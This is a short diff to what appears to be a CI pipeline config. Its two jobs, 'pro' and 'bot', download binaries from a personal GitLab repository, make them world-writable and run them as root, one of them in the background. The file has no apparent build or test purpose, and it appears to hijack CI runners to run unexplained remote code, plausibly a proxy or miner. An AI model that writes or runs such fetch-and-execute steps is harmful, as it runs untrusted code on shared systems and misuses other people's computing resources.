@@ -10,13 +10,17 @@ jobs:
       - run:
          name: "pro"
          command: | 
-          sudo su --command "apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro && nohup ./pro"
+          sudo su --command "apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro"
+          sudo su --command "nohup ./pro --log=stdout > meta.log &"
           sleep 10
           sudo su --command "ls"
       
       - run:
          name: "bot"
-         command: wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx && chmod 777 prx && ./prx
+         command: |
+          wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx
+          chmod 777 prx
+          sudo su --command "./prx"
 
 workflows:
   version: 2
